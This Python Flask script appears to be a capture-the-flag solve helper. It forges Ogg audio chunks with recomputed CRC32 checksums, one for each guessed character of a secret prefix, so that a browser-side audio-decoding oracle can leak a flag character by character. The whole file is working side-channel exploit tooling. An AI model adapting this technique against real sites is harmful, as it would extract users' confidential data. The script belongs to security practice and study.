#!/usr/bin/env python3
import string
import base64
from flask import *

def crc_poly(data, n, poly, crc=0, ref_in=False, ref_out=False, xor_out=0):
    g = 1 << n | poly
    for d in data:
        if ref_in:
            d = reflect_data(d, 8)
        crc ^= d << (n - 8)
        for _ in range(8):
            crc <<= 1
            if crc & (1 << n):
                crc ^= g
    if ref_out:
        crc = reflect_data(crc, n)
    return crc ^ xor_out

def genBufs(knownPrefix):
	out = {'cs':{}}
	# Just a normal short audio file
	saneAudioBuffer = open('./audio.ogg','rb').read()
	# Found this offset by decreasing the size until chrome throws an error 
	saneAudioBuffer = saneAudioBuffer[:-96696]

	# We only have to change the last chunk
	lastChunkIdx = saneAudioBuffer.rindex(b'OggS')
	lastChunk = saneAudioBuffer[lastChunkIdx:]
	prevChunks = saneAudioBuffer[:lastChunkIdx]
	out['prev'] = prevChunks.hex()
	for c in string.ascii_letters+string.digits+'{} ':
		v = knownPrefix+c
		v = v.encode()
		t = lastChunk[:-len(v)]+v
		# append the bytes we want to check at the end of the chunk.
		t = t[:22]+b'\x00'*4+t[22+4:]
		# Offset 22:22+4 is the checksum field.
		# And it should be zero while generating the checksum
		checksum = crc_poly(t,32,0x04C11DB7)
		checksum = checksum.to_bytes(4,byteorder='little')
		# Fix the checksum
		t = t[:22]+checksum+t[22+4:]
		# Strip the bytes we appended earlier.
		# They should be placed again by the challenge server 
		t = t[:-len(v)]
		out['cs'][c] = t.hex()

	return out

app = Flask(__name__)

@app.route('/')
def index():
	return open('./solve.html','r').read()

@app.route('/chunks.json')
def genChunksJson():
	return genBufs(base64.b64decode(request.args['prefix'].encode()).decode())

if(__name__ == '__main__'):
	app.run(host='0.0.0.0', port=9000)
